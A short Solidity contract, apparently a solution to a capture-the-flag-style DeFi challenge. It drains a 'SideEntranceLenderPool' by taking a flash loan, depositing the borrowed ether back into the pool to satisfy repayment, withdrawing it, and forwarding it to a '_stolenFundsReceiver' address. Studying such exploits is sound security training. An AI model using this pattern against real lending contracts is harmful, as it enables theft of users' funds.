// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract AttackSideEntrance {

    SideEntranceLenderPool pool;
    uint256 constant ATTACK_AMOUNT = 1000 ether;

    constructor(SideEntranceLenderPool _pool) {
        pool = _pool;
    }

    function execute() external payable {
        bytes memory data = abi.encodeWithSignature("deposit()");
        (bool sent, ) = address(pool).call{value: msg.value}(data);
        require(sent, "Deposit failed!");
    }

    function attack(address _stolenFundsReceiver) external {
        pool.flashLoan(ATTACK_AMOUNT);
        pool.withdraw();
        (bool sent, ) = _stolenFundsReceiver.call{value: ATTACK_AMOUNT}("");
        require(sent, "Transfer failed!");
    }

    fallback() external payable {}
}